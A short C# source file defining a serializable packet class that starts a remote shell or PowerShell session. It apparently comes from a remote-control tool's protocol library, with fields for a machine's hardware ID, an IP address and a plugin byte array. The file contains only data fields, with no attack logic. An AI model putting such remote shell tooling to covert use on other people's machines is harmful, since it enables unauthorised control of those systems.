using System;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class StartShellSessionPacket : IPacket
    {
        public StartShellSessionPacket(bool isPWS) : base()
        {
            this.PacketType = PacketType.SHELL_START;
            this.isPWS = isPWS;
        }

        public string HWID { get; set; }
        public string BaseIp { get; set; }
        public byte[] Plugin { get; set; }
        public PacketType PacketType { get; }
        public PacketState PacketState { get; set; }
        public string Status { get; set; }
        public string DatePacketStatus { get; set; }
        public int PacketSize { get; set; }
        public bool isPWS { get; set; }
    }
}
